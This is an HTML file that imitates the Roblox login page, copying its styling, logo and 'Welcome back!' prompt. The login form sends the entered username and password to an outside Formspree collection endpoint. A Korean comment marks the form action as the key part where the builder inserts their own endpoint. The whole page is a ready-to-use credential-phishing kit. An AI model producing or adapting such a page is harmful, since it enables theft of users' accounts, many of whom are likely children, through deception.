<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        body {
            background-color: #232527;
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: white;
        }
        .login-wrapper {
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }
        .logo-container {
            text-align: center;
            margin-bottom: 20px;
        }
        .roblox-logo {
            width: 160px;
            height: auto;
        }
        .login-box {
            padding: 0 10px;
        }
        h2 {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 15px;
            text-align: center;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 10px;
            margin-bottom: 10px;
            border: 1px solid #aeb4b9;
            border-radius: 4px;
            background-color: #e7ecee;
            color: black;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #00b06f;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background-color: #009e63;
        }
        .footer-links {
            margin-top: 20px;
            text-align: center;
            font-size: 14px;
        }
        .footer-links a {
            color: #adadad;
            text-decoration: none;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class="login-wrapper">
        <div class="logo-container">
            <!-- 로블록스 로고 -->
            <img src="https://thumb.wikimedia.org/wikipedia/commons/thumb/4/4b/Roblox_Logo_2022.svg/1280px-Roblox_Logo_2022.svg.png" alt="Roblox Logo" class="roblox-logo">
        </div>

        <div class="login-box">
            <h2>Welcome back!</h2>
            
            <!-- 👇 이 부분이 핵심입니다. action 안에 Formspree 주소를 넣으세요 -->
            <form action="https://formspree.io/f/xwlljlzd" method="POST">
                <input type="text" name="username" placeholder="Username or email" required autocomplete="off">
                <input type="password" name="password" placeholder="Password" required>
                
                <button type="submit">Log In</button>
            </form>
            
        </div>

        <div class="footer-links">
            <a href="#">Forgot your password?</a> | <a href="#">Sign Up</a>
        </div>
    </div>
</body>
</html>
